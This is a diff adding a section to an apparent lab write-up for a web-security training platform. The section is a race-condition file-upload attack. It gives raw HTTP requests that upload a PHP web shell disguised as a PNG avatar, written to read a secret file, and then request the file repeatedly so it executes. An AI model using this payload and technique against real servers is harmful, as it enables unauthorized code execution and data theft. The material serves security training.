@@ -295,3 +295,73 @@ Content-Disposition: form-data; name="csrf"
 ------WebKitFormBoundaryoY00TJK9X69oAtHx--
 
 ```
+
+
+## 7. Web shell upload via race condition
+
+`Single packet attack`
+
+1. Request for upload 
+
+```
+POST /my-account/avatar HTTP/2
+Host: 0ada004203b4856381582069009100e6.web-security-academy.net
+Cookie: session=XA2oz2GM1l8OUTVHIlRlhSewAnvtiIIe
+Content-Length: 456
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0ada004203b4856381582069009100e6.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJWYpEUyfmFtZxJEn
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ada004203b4856381582069009100e6.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+------WebKitFormBoundaryJWYpEUyfmFtZxJEn
+Content-Disposition: form-data; name="avatar"; filename="fb.php"
+Content-Type: image/png
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+------WebKitFormBoundaryJWYpEUyfmFtZxJEn
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryJWYpEUyfmFtZxJEn
+Content-Disposition: form-data; name="csrf"
+
+QoNsv5yy8ZirPldKqjdftqWpwd85BjWA
+------WebKitFormBoundaryJWYpEUyfmFtZxJEn--
+
+```
+
+2. 5 GET requests to run exploit
+
+```
+GET /files/avatars/fb.php HTTP/2
+Host: 0ada004203b4856381582069009100e6.web-security-academy.net
+Cookie: session=XA2oz2GM1l8OUTVHIlRlhSewAnvtiIIe
+Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+
+```
